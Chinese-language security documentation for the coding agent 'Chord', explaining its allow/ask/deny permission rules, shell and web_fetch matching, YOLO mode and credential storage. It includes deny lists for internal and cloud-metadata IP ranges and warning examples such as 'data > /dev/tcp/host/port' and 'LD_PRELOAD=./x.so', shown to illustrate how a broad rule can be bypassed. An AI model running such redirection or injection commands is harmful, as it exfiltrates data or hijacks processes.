# 权限与安全

Chord 是一个可读取文件、修改文件、执行命令并调用外部工具的 coding agent。执行前请检查审批内容；权限规则是风险控制，不是操作系统级沙箱。

## 核心原则

- 默认把高风险能力设为 `ask`
- 对明显危险或不需要的能力使用 `deny`
- 仅对低风险、可预期的动作使用 `allow`
- 把 API keys 放在 `auth.yaml` 或环境变量里，不要写进项目文件

## 权限模型

常见权限状态：

- `allow`：自动允许
- `ask`：执行前要求确认
- `deny`：直接拒绝

规则按工具名匹配；内置工具名的完整清单见[内置工具](./tools_CN.md)。

规则指名了不存在的工具时匹配不到任何东西，因此拼错工具名会让规则静默失效，而不是报错。后台工作通过 `shell`（配合 `run_in_background: true`）加 `job_output`、`job_list`、`job_kill` 工具完成。

在 TUI 确认框中，`M` 用于打开当前工具调用的「添加规则」选择界面；进入该界面后，再按 `Enter` 才会保存所选规则并允许这次调用。对于 `delete`，选择器不会提供复用价值很低的单文件规则，而是按覆盖本次待审批目标的数量优先列出父目录规则。全局 `*`（任意删除路径）始终保留；当本次请求的所有目标都位于当前工作目录内时，还会提供 `**`（当前目录下任意路径）。这两个宽规则都不会默认选中。

权限可在 Agent 配置中定义。推荐从下面这套个人开发模板开始，再按项目风险收紧或放宽：

```yaml
permission:
  "*": allow
  handoff: deny
  delegate: deny
  delete: ask
  web_fetch:
    "localhost:8000": ask
    "169.254.0.0/16": deny
    "10.0.0.0/8": deny
    "192.168.0.0/16": deny
  shell:
    "sudo *": ask
    "rm *": ask
    "rmdir *": ask
    "mv *": ask
    "git add *": ask
    "git checkout *": ask
    "git clean *": ask
    "git commit *": ask
    "git push *": ask
    "git reset *": ask
    "git restore *": ask
    "git tag *": ask
```

这套配置的含义：默认允许大多数工具；禁用 `handoff` 与 `delegate`；删除文件、选定的 WebFetch URL pattern、以及常见高风险 shell/git 命令需要确认。权限规则按「最后匹配优先」生效，因此 `web_fetch` 和 `shell` 下更具体的规则会覆盖顶层 `"*": allow`。适合单人、可信工作区；共享仓库、团队服务或自动化 headless 部署应进一步收紧。本页以 `"*": allow` 作为可信工作区基线；若想改用最小授权基线，[配置：Agent 配置](./configuration_CN.md#agent-配置)中的 `builder` agent 从 `"*": deny` 起步，只对角色确需的工具逐项放开。

权限匹配会看工具调用和会话工作目录（工具实际执行的目录）。`shell` 只匹配命令字符串，`workdir` 参数不参与。文件类工具（`read`、`write`、`edit`、`apply_patch`、`delete`、`view_image`）的目标路径会先按工作目录归一化，再与规则匹配：工作目录内的路径按相对形式匹配（`foo.go`、`./foo.go` 以及同一文件的绝对拼写都会命中同一条规则），工作目录外的路径保持绝对形式。

文件类规则的生效范围由写法决定：

- `*` 匹配一切路径拼写，和以前一样表示「任意路径」。
- 相对写法（`**`、`src/**`、`tmp/*`）锚定工作目录，只匹配目录内的路径。所以 `**` 就是「当前目录下所有内容」，`./**` 也按同一语义处理。
- 绝对写法（`/Users/me/other/**`、`~/other/**`、`/**`）只匹配工作目录外的绝对路径。`/**` 表示「所有绝对路径」，和 `**` 合起来覆盖的范围相当于 `*`。Windows 上 home 相对写法两种分隔符都可以用（`~\other\**` 或 `~/other/**`）。
- 绝对写法不再命中工作目录内的文件；要限制目录内路径，请改用相对写法。

`shell` 规则只约束提交的命令字符串，并不是文件系统沙箱。放行的命令仍可在内部 `cd` 到别处、调用其他程序或操作绝对路径。审批策略应使用尽量窄的 shell pattern；若要真正限制文件系统范围，还需使用操作系统级沙箱。

### WebFetch 目标匹配

`web_fetch` 的规则 pattern 按网络语义匹配主机，形如 `host[:port]`：

- **host（主机）**：域名（`example.com`）、域名通配（`*.internal`、`*`）、单个 IP（`127.0.0.1`、`::1`），或 CIDR 网段（`10.0.0.0/8`、`169.254.0.0/16`、`fd00::/8`）。IPv6 地址或 IPv6 CIDR 指定端口时需要方括号，例如 `[fd00::/8]:443`。
- **port（端口）**：省略或写 `*` 表示任意；可以是单个端口（`8080`）或范围（`8000-9000`）。请求 URL 未写端口时按其协议取默认（http→80、https→443）。
- 不支持 scheme（协议）和 path（路径）pattern。

```yaml
web_fetch:
  "*": allow                  # 默认放行一切
  "0.0.0.0/8": deny
  "10.0.0.0/8": deny
  "127.0.0.0/8": deny
  "169.254.0.0/16": deny      # 云元数据 endpoint
  "192.168.0.0/16": deny
  "*:8000-9000": ask         # 任意主机的这些端口需确认
  "*.internal": deny         # 内网域名
```

匹配发生在**请求发出之前**，针对模型给出的 URL；**不会**按解析后的连接 IP 复检。因此域名解析到内网地址、或 HTTP 重定向到内网，都**不会**被 IP/CIDR 规则拦住。请把这类规则视为意图层面的管控，而非网络沙箱。

### 特殊权限语义

大多数工具都按上面的 `allow` / `ask` / `deny` 字面含义执行，但少数编排工具有意带有额外联动，使权限设置与 Chord 能安全运行的工作流保持一致：

- `edit` 和 `apply_patch` 属于同一个文件编辑工具族，只是面向模型暴露的编辑格式不同（`patch` 作为 `apply_patch` 的旧别名仍被接受）。当另一个编辑器没有同名显式规则时，一个编辑器的规则会作用到另一个编辑器。这也包括 `deny`：`*: allow` 后面配置 `edit: deny` 会同时禁用 `edit` 和 `apply_patch`，因为 `apply_patch` 继承了编辑工具族的拒绝规则。如果需要两个格式有不同行为，请同时配置 `edit` 和 `apply_patch`。例如 `edit: allow` 加 `apply_patch: deny` 会禁用 `apply_patch` 但保留 `edit`，GPT/o 系列模型会退回使用 `edit`；反过来，`apply_patch: allow` 加 `edit: deny` 会让默认偏好 `edit` 的非 GPT 模型退回使用 `apply_patch`。
- `handoff` 和 `done` 会被当作控制 gate。设为 `deny` 会隐藏或禁用对应工作流；设为 `allow` 或 `ask` 都会让工作流可用，真正交接 / 完成时 Chord 仍可能显示本地确认（例如 loop 的 `done` 确认）。也就是说，`ask` 不是这两个工具的「更强工作流模式」，它主要表示工具保持可见 / 可用，同时保留 Chord 内建确认 gate。这个取舍可以避免模型看到一个可用控制工具却最终无法完成，同时仍防止静默切换角色或过早退出 loop。
- `done` 是 loop 工作流的退出信号，Chord **只在 loop 运行期间**挂载它。普通会话的工具面里根本没有它，因此每个请求都不必携带它的定义，模型也不用在「直接回复」和「调用完成工具」之间做选择。进入 loop 模式时才挂载：provider 支持会话中途追加工具时（Responses 系模型与 Kimi dynamic tools）作为附加工具挂上，其余情况通过一次工具面重建注入——代价是一次 prompt cache 失效。退出 loop 会把它收回。若有规则拒绝 `done`，`/loop on` 会被拒绝并给出 toast，因此 `done: deny` 等于把 loop 的终止权保留给用户。
- `delegate` 会匹配调用参数中的 `agent_type`，因此每个角色都可以只允许委派给指定的 SubAgent 定义。例如，下面按声明顺序先拒绝所有目标，再允许 `reviewer`，并要求委派给 `tester` 前进行确认：

  ```yaml
  permission:
    delegate:
      "*": deny
      reviewer: allow
      tester: ask
  ```

  被拒绝的目标不会出现在 Delegate 工具 schema 或协调 prompt 中；如果所有已配置的 SubAgent 目标都被拒绝，Delegate 会被隐藏。权限规则按「最后匹配优先」生效，因此通配兜底规则应写在具体目标规则之前。
- `delegate` 也控制一组委派工作流。如果有效的通配 `deny` 将它整体禁用，Chord 还会禁用通过 `cancel` 取消 SubAgent、从 SubAgent 中隐藏嵌套的 `delegate` / `cancel`，并把 SubAgent 的 `notify` 限制为只通知自己的 owner，而不是任意指定目标。原因是取消或定向通知其他委派任务本身属于管理 delegated workstreams；如果禁用委派却允许这些片段，会形成一个不完整但仍可干扰委派工作的控制面。
- 因此 `cancel` 依赖 `delegate`：即使配置了 `cancel: allow`，只要 `delegate` 被禁用，`cancel` 仍会被拒绝。若希望某个角色能取消委派工作，需要同时启用 `delegate` 和 `cancel`。
- `question: ask` 会被归一化为 `allow`。`question` 工具本身就是向用户提出结构化问题并等待回答；如果在提问前再加一次权限确认，只会产生重复弹窗，并不能降低最终决策风险。
- 有两个控制工具不受纯通配规则约束，因为让它们变得可用的那个开关本身就是授权：`compact_context`（仅在启用 `context.compaction.model_driven` 时注册）和 `done`（仅在 loop 运行期间挂载）。allowlist 角色的 `"*": deny` 既不会隐藏它们，也不会拦截其调用，否则用户启用了模型驱动压缩或开启了 loop，却发现毫无反应，除非他还知道要额外放行一个内部工具名。只有**指名**该工具的规则才能覆盖这个默认：`deny` 移除工具，`ask` 保留工具但每次调用需确认，`allow` 与默认一致。像 `compact_*` 这样的窄匹配算指名，写成带参数形式的规则也算：这两个工具都不接受用于权限匹配的参数。它们也都没有对外副作用：一个收缩上下文，一个结束 loop，通配规则在这里没有可保护的能力。
- YOLO 消除的是日常工作中高频确认带来的摩擦：文件编辑和 shell 命令。开启期间，主 agent 的普通工具会完全跳过权限检查：`ask` 不再弹确认，`deny` 也不会拦截。这个放宽是单向的，只放宽不收紧（关闭 YOLO 时可用的工具，开启期间不会变得不可用），关掉 YOLO 即完全恢复原权限。YOLO **不是**对角色边界的重新定义。控制工具改变的是 agent 拓扑和会话生命周期，而不是单次操作的风险面；它们调用频率很低，确认它们本来就不是 YOLO 想消除的那种摩擦，因此 YOLO 下它们仍按配置的规则执行：`handoff`、`delegate`、`cancel`、`done`、`compact_context`。它们分为两类：
  - `handoff`、`delegate`、`cancel` 会给角色带来它原本没有的能力：把会话交给另一个角色、派发子 agent 工作、取消不属于自己的任务。YOLO 下它们仍按配置的规则判定，只放宽一处：`ask` 不再弹共享确认框、直接放行。`allow` 照常放行，`deny` 照常拒绝；通配默认也和关闭时一致：宽泛的 `"*": allow` 会让它们保持可用，allowlist 的 `"*": deny` 让它们保持拒绝，规则没提到它们（或根本没配规则）时行为也与关闭时相同。所以 YOLO 不会授予规则之外的新编排能力：`builder` 这类单 agent 角色在 YOLO 开启时仍然是单 agent，是因为它自己的规则 deny 了 `handoff` 和 `delegate`，这条 deny 在 YOLO 下照常生效。为了跳过编辑确认而打开 YOLO，并不等于声明这个角色现在应该去编排 SubAgent。
  - `done` 和 `compact_context` 只是结束或收缩当前这段工作，YOLO 不改变它们的专门语义，行为与关闭时完全一致：指名它们的规则照常生效（`deny` 仍会移除或禁用对应工具，`compact_context` 的显式 `ask` 在 YOLO 下仍会逐次确认）。
  - SubAgent 在执行时继承该模式，但始终按自己的完整规则集判定：YOLO 开启期间，它们需要 `ask` 的调用（普通工具和上面的机制工具都一样）不再弹共享确认框、直接放行；`deny` 依然拒绝（只读 worker 的 `write: deny` 仍然生效），`done`、`compact_context` 保持各自语义。继承是即时的：关闭 YOLO 后，SubAgent 的后续调用立即恢复确认。

> 权限属于 Agent 级配置，不是简单的全局开关。

对于 `shell`，像 `"git *": allow` 这样的具体 `allow` pattern 不会自动放行这类命令：含未引用 shell 分隔符（`;`、`&&`、`||`、`|`、`&` 或换行）、含命令替换（`$(...)` 或反引号，双引号里的也算），以及引号解析不出来（引号没闭合、结尾是反斜杠）。这类调用会继续匹配后续规则，通常回到 `ask` 或 `deny`。单引号里或反斜杠转义后的分隔符只是字面量，仍会命中窄规则。这只是安全兜底，不是 shell 沙箱；`shell: allow` 或 `shell: { "*": allow }` 这类宽泛规则只应给完全可信的角色使用。

但一条针对具体命令的 `allow` 会覆盖该命令的全部能力，包括输出重定向和内联的环境变量赋值前缀。若放行了 `echo *`，那么 `echo secret > ~/.bashrc`、`echo x >> file`、`data > /dev/tcp/host/port`、`LD_PRELOAD=./x.so echo hi` 都会被允许——重定向目标和环境变量前缀属于这一条 shell 命令的组成部分，而非独立的工具调用，因此不会被单独匹配或管控。只有当你能接受某命令的最坏情况（通过重定向任意写文件、覆盖环境变量）时，才给它命令级 `allow`；否则保持 `ask`。

## Shell 与 shell 风险

`shell` 能执行系统命令，应格外谨慎。无论是前台运行还是作为后台 job，`shell` 都是刻意设计的非交互工具：Chord 不会把模型可控的 stdin 接入子进程；Unix 子进程会在没有 controlling TTY 的环境中运行；高置信的交互式命令会在执行前被拒绝。普通 stdin 读取（如 shell `read`/`select`）会看到 EOF，而不是等待模型输入；如果命令需要输入，请通过 pipe、here-doc、文件或参数显式提供。登录向导、终端编辑器、pager / 全屏 TUI、密码提示、以及需要 `/dev/tty` 的命令，应在真实终端中手动执行，或改写为显式提供输入/参数的非交互命令。

`shell`（前台或后台 job）的平台说明：

- 在 Unix 上，Chord 会把子进程放到新的 session 中，并在超时/取消时按进程组清理。
- 在 Windows 上，Chord 仍然保持 `shell`（前台命令与后台 job）非交互，但这里没有与 Unix `setsid` / 进程组控制完全等价的路径；超时/取消时会退回到直接终止进程，对后代进程的清理可能不如 Unix 完整。

常见改写方式：

- 用 `git commit -m "message"` 或 `git commit -F file` 代替会打开编辑器的 `git commit`
- amend 时如果要保留现有提交信息，使用明确不会打开编辑器的形式，如 `git commit --amend --no-edit` 或 `git commit --amend -C HEAD`
- 避免在 `shell` 中运行交互式 Git patch 流程（`git add -p`、`git commit -p`、`git stash -p`）；改为显式指定 pathspec，或在真实终端中手动执行
- 容器命令不要分配 TTY（如 `docker exec -it`、`docker run -t`、`podman run -t`、`kubectl exec -it`），除非你是在真实终端中手动运行
- 用 `npm init -y` / `--yes`，或显式提供所有必要选项
- 需要 sudo 非交互失败时用 `sudo -n`，避免等待密码提示
- 命令确实支持非交互 stdin 时，用 pipe 或 here-doc 显式提供输入

建议：

- 默认把文件删除、批量改写、网络下载、数据库操作保留为 `ask` 或 `deny`
- 如需管控本地/内网服务或敏感 endpoint，使用 `web_fetch` pattern——按主机/端口（`web_fetch: { "localhost:8000": ask }`）或按地址段（`web_fetch: { "169.254.0.0/16": deny, "*:8000-9000": ask }`）
- 仅对少量可预期的开发命令设置 `allow`
- 不要把权限匹配理解为安全沙箱

**重要**：Chord 的权限匹配是产品层面的风险控制，不是操作系统级隔离或安全沙箱。

## 文件修改风险

文件工具会直接操作工作区，不是预演。重要仓库应配合 Git 使用，生产配置、部署脚本和密钥文件建议保持 `ask`。

### 哪些操作会改文件

| 操作 | 影响 |
| --- | --- |
| `write` | 创建文件，或整体替换已有普通文件。 |
| `edit` / `apply_patch` | 修改局部内容；补丁还可新增、移动和删除文件。独立文件组可能部分成功，重试前先看已应用的修改。 |
| `delete` | 删除文件，不要求模型先完整读取。删除符号链接只移除链接，不删除目标；`write` 拒绝跟随符号链接。 |
| `read` / `view_image` / `grep` | 不修改文件，但读取内容可能进入会话和模型请求。只读不代表敏感数据不会外发。 |

### 写入前的检查与备份

- **整体覆盖**：`write` 不会仅因模型没读过当前版本而拒绝。未读取、读取不完整或文件后来有变化时，会尝试备份旧内容并在结果中给出位置。内容与模型最近一次写入或编辑的结果一致时，不另做备份。
- **无法读取旧内容**：写入仍可能继续，但无法备份，结果只会提示风险。新文件不需要旧版本备份。
- **局部编辑**：`edit` 和 `apply_patch` 会核对当前文件的定位内容。即使文件有变化，只要定位仍有效，也可能在警告后继续修改，并尽力备份有风险的非空旧内容。
- **删除文件**：模型尚未观察到文件当前内容时，会尝试备份确切的磁盘字节，包括空文件；不会跟随符号链接备份目标。

备份最多每个路径 10 份、每个会话 200 份，单文件上限 10 MiB，会话总上限 50 MiB。局部编辑的备份超限或失败不会阻止修改，且失败可能只记入日志。**不要把会话备份当作可靠的版本管理；清理会话也会删除这些备份。**

### 文件读取限制

按路径读取的工具拒绝 `/dev/stdin`、`/dev/stdout`、`/dev/stderr` 等受限设备路径。本地文本工具优先使用 UTF-8 或带 BOM 的 Unicode，也对 GB18030、Big5、Shift-JIS 等编码提供有限支持；无法明确识别或不支持的编码会报错。`web_fetch` 按 HTTP 响应声明的字符集解码。

## 凭据与配置

- API keys 建议放在 `~/.config/chord/auth.yaml`
- 也可通过环境变量引用
- 不要将真实密钥写入示例配置、脚本或项目仓库
- 为 `auth.yaml` 设置严格权限，如 `chmod 600 ~/.config/chord/auth.yaml`

## Headless 模式安全边界

`chord headless` 适合作为 bot / gateway 的底层控制面，但它本身不负责多租户隔离、浏览器安全边界或权限托管。

接入聊天平台、自动化系统或团队服务时，应在外层额外控制：

- 允许访问哪些工作目录
- 允许调用哪些命令
- 谁可以批准高风险操作
- 事件如何审计与留痕

## 网络与外部集成

Chord 支持接入：

- provider API
- LSP
- MCP
- Hooks
- 本地 shell 命令

这些能力都会扩大运行时边界。接入前建议逐项确认：

- 是否真的需要该能力
- 它会读写哪些资源
- 出错时如何回滚或停用
- 是否会把敏感数据带到外部服务

## 使用建议

- 在共享仓库或团队环境中，不要默认全局 `allow`
- 对自动化 Hook 和 MCP 工具做最小权限暴露

## 相关文档

- [配置与认证](./configuration_CN.md)
- [扩展与定制](./customization_CN.md)
- [Headless 集成](./headless_CN.md)
